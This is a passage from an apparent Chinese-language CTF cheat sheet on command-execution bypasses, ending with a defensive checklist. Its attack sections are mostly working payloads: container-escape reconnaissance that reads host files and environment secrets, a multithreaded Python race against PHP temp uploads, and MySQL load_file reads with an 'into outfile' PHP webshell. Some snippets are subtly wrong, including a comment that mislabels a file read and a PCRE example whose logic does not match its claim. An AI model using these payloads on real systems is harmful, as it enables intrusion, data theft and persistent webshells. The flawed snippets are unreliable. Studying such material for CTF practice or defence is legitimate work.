cat /tmp/flag.txt  # 读取/etc/passwd
```

**关键技巧**：
- PATH环境变量污染可以劫持命令执行
- LD_PRELOAD可以注入恶意动态库
- 符号链接可以指向敏感文件

---

### 组合12：容器环境+挂载点逃逸（命令执行场景）

**场景**：Docker容器内命令执行

**绕过方法**：
```bash
# 步骤1：检测容器环境
ls -la /.dockerenv
cat /proc/1/cgroup | grep docker

# 步骤2：查找主机挂载点
mount | grep -i host
df -h | grep -v overlay

# 步骤3：如果发现挂载点，尝试访问主机文件
# 假设/host挂载了主机的根目录
cat /host/etc/passwd
ls /host/root/

# 步骤4：如果可以访问docker.sock，尝试容器逃逸
ls -la /var/run/docker.sock

# 步骤5：读取容器环境变量，可能包含敏感信息
env | grep -i secret
env | grep -i password
```

**关键技巧**：
- 检查 `/.dockerenv` 判断是否在容器内
- 查找主机挂载点（`mount`、`df`）
- 检查 `/var/run/docker.sock` 是否可访问
- 读取环境变量获取敏感信息

---

### 组合13：正则回溯限制绕过+PCRE限制（PHP场景）

**场景**：`preg_match("/^[a-z]+$/", $input)` + 输入过长

**绕过方法**：
```php
// 利用PCRE回溯限制绕过正则匹配
// pcre.backtrack_limit 默认值：1000000

// 构造超长字符串触发回溯限制
$input = str_repeat('a', 1000000) . 'b<?php system("cat flag.php");?>';

// 当正则匹配失败时，preg_match返回false
// 某些代码可能将false判断为匹配成功，导致绕过

// 示例代码：
if (preg_match("/^[a-z]+$/", $input)) {
    // 预期：只允许小写字母
} else {
    // 实际：回溯限制导致匹配失败，进入else分支
    eval($input);  // 绕过！
}
```

**关键技巧**：
- PCRE有回溯限制（`pcre.backtrack_limit`）
- 超长字符串可能导致正则匹配失败
- 某些代码将 `preg_match` 返回 `false` 判断为匹配失败，导致绕过

---

### 组合14：临时文件上传+通配符+条件竞争（命令执行场景）

**场景**：允许文件上传 + 命令执行 + 过滤字母数字

**绕过方法**：
```bash
# 原理：POST上传文件保存在/tmp/php??????，使用通配符匹配并执行

# 步骤1：构造恶意脚本内容
#!/bin/sh
cat flag.php

# 步骤2：使用通配符匹配临时文件并执行
?c=. /???/????????[@-[]

# [@-[] 是通配符，匹配特定字符范围
# 通过条件竞争，在临时文件被删除前执行

# Python脚本自动化攻击：
import requests
import threading

url = "http://target/?c=. /???/????????[@-[]"
files = {'file': '#!/bin/sh\ncat flag.php'}

def upload():
    for _ in range(100):
        requests.post(url, files=files)

# 启动多线程条件竞争
for _ in range(10):
    threading.Thread(target=upload).start()
```

**关键技巧**：
- POST上传文件临时保存在 `/tmp/php??????`
- 使用通配符 `/???/????????[@-[]` 匹配临时文件
- 使用 `. script` 或 `source script` 执行脚本
- 条件竞争：在临时文件被删除前执行

---

### 组合15：SQL注入+load_file读取文件（PHP代码执行场景）

**场景**：`eval($c)` + `disable_functions` 禁用所有文件读取函数 + 可以连接MySQL

**绕过方法**：
```php
// 使用MySQL的load_file()函数读取文件（在eval中执行）
try {
    $dbh = new PDO('mysql:host=localhost;dbname=ctftraining', 'root', 'root');

    foreach ($dbh->query('select load_file("/flag.txt")') as $row) {
        echo ($row[0]) . "|";
    }

    $dbh = null;
} catch (PDOException $e) {
    echo $e->getMessage();
    exit(0);
}
exit(0);

// 或使用into outfile写入文件
try {
    $dbh = new PDO('mysql:host=localhost;dbname=ctftraining', 'root', 'root');

    $dbh->query('select "<?php system($_GET[cmd]);?>" into outfile "/var/www/html/shell.php"');

    $dbh = null;
} catch (PDOException $e) {
    echo $e->getMessage();
}
exit(0);
```

**关键技巧**：
- `load_file()` 需要 FILE 权限
- `into outfile` 可以写入文件
- 绕过 `disable_functions` 对文件读取函数的限制
- 使用 `exit()` 避免后续处理

---

## 防御检查清单

- ✓ 白名单验证命令和参数
- ✓ 避免使用shell=True（Python subprocess）
- ✓ 使用参数列表而非字符串拼接
- ✓ 过滤所有危险字符（;、|、$、()等）
- ✓ 使用escapeshellcmd/escapeshellarg（PHP）
- ✓ 禁用eval()、assert()、create_function()
- ✓ 限制或禁用反射API（ReflectionClass）
- ✓ 检查并禁用危险函数（call_user_func等）
- ✓ 严格的黑名单/白名单审查
- ✓ 监控和日志记录所有命令执行
- ✓ 检查环境变量污染防护（PATH、LD_PRELOAD、IFS）
- ✓ 验证容器/沙箱环境配置
- ✓ 使用seccomp、AppArmor、SELinux限制系统调用
- ✓ 最小权限原则运行应用
- ✓ 定期更新依赖库防止已知漏洞
- ✓ 限制临时文件权限，防止条件竞争
- ✓ 禁用data://、php://等危险协议
- ✓ 验证文件上传类型和内容
- ✓ 限制数据库用户权限（禁用FILE权限）
- ✓ 设置合理的PCRE限制（pcre.backtrack_limit）
- ✓ 禁用FFI扩展（PHP 7.4+）
- ✓ 检查符号链接安全性
- ✓ 容器环境避免挂载敏感目录
